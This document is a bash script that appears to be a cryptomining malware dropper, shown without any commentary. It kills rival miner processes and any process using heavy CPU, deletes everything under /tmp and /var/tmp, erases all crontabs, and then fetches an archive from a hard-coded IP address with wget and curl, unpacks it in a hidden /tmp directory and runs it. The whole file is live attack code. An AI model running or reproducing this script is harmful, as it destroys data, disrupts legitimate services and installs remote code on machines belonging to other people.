#!/bin/bash

kill -9 `cat /tmp/.X11unix`
kill -9 `cat /tmp/.lsdpid`

rm -rf /tmp/*
rm -rf /var/tmp/*
rm -rf /var/tmp/.lib
killall -9 trace
killall -9 kintegrityds
killall -9 kpsmouseds
killall -9 md
crontab -r
rm -rf /tmp/.jenkins/jenkins/./-bash
netstat -antp | grep ":14444" | awk '{print $7}' | cut -d "/" -f 1 | xargs kill -9
netstat -antp | grep ":3333" | awk '{print $7}' | cut -d "/" -f 1 | xargs kill -9
ps -ef|grep -v grep|grep "trace"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "kintegrityds"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "kpsmouseds"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "kerberods"|awk '{print $2}'|xargs kill -9
ps -ef|grep -v grep|grep "khugepageds"|awk '{print $2}'|xargs kill -9
ps aux|grep -v grep|grep -v "/bin/sh"|awk '{if($3>=80.0) print $2}'|xargs kill -9
ps -e -o pcpu,pid,args | grep -v grep | grep -v "/bin/sh" | awk '{if($1>30.0) print $2}' | while read procid
do
kill -9 $procid
done
if crontab -l | grep -q "pastebin"
then
crontab -r
else
echo "ok" >> /dev/null
fi
rm -rf /tmp/.lock
cd /tmp
mkdir .scr
cd .scr
wget -q 45.55.211.79/.cache/jenkins/2/sn2.tar.gz
curl -O 45.55.211.79/.cache/jenkins/2/sn2.tar.gz
tar -zxvf sn2.tar.gz
rm -rf sn2.tar.gz
cd sn2
chmod +rwx *
./go



